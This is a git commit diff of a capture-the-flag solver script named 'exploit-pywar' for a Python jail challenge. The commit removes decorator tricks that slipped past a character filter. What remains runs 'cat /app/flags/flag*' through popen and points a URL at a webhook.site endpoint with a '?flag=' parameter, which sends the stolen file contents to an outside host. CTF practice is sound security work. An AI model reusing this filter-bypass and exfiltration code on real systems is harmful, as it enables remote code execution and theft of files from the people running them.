0a3a80c18034667533ba1c33e75df1d1f7022a14
naup96321 <naup96721@gmail.com>
2025-04-28 12:00:37 +0800

    exploit-pywar

--- PyWars/solver/script/__main__.py
+++ PyWars/solver/script/__main__.py
@@ -1,22 +1,7 @@
 from os import popen
+from urllib.request import urlopen
 
-cmd = lambda a: "ls /app"
-func1 = lambda f: [x[:-1] for x in f][2][-3]
-
-@func1
-@popen
-@cmd
-class dots:pass
-
-dot = dots
-importurlib = "from urllib" + dot + "request import urlopen"
-importlib = lambda f: importurlib
-
-@exec
-@importlib
-class importlibf:pass
-
-url = "https://webhook" + dot + "site/5399367e-260a-4a67-bfbc-575f6aaeb333/?flag="
+url = "https://webhook.site/5399367e-260a-4a67-bfbc-575f6aaeb333/?flag="
 
 cmd2 = lambda a: "cat /app/flags/flag*"
 func2 = lambda f: [x[:-1] for x in f][0]
